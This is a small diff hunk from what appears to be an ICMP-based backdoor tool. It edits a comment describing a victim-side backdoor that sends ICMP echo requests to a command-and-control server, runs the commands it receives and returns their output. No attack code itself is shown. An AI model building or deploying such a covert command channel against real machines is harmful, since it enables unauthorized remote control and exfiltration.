@@ -8,7 +8,7 @@ ICMP_ID = int(13170)
 TTL = int(64)
 
 # This is the backdoor on the victim machine , will send ICMP echo request to
-# C2, then will wait for command to execute. 
+# C2, then will wait for command to execute , and send the output as request
 # Request- type 8
 # Reply -  type 0
 
